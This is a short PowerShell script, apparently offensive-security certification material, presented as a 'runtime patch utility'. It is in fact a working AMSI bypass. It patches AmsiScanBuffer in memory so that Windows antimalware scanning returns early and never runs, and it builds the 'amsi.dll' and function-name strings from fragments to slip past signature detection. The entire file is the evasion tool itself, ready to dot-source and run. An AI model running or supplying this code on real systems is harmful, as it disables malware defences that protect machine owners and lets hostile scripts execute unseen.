# OSEP - Runtime patch utility
# . .\amsi_bypass.ps1 ; Invoke-Patch

function Invoke-Patch {
    # Patch AmsiScanBuffer in-process via VirtualProtect + Marshal.Copy
    # Does not reference amsi strings — patches memory directly
    try {
        Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Mem {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);
}
'@ -EA Stop

        $lib  = [string]::Join('', ('am','si','.','dl','l'))
        $proc = [string]::Join('', ('Amsi','Scan','Bu','ffer'))
        $h    = [Mem]::LoadLibrary($lib)
        $ptr  = [Mem]::GetProcAddress($h, $proc)

        # ret (0xC3) — function returns immediately, scan never runs
        $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
        $op    = [uint32]0
        $len   = [System.UIntPtr]::new([uint64]6)
        [Mem]::VirtualProtect($ptr, $len, 0x40, [ref]$op) | Out-Null
        [Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
        [Mem]::VirtualProtect($ptr, $len, $op, [ref]$op)  | Out-Null
        Write-Host "[+] Patch applied"
    } catch {
        Write-Host "[-] Patch failed: $_"
    }
}
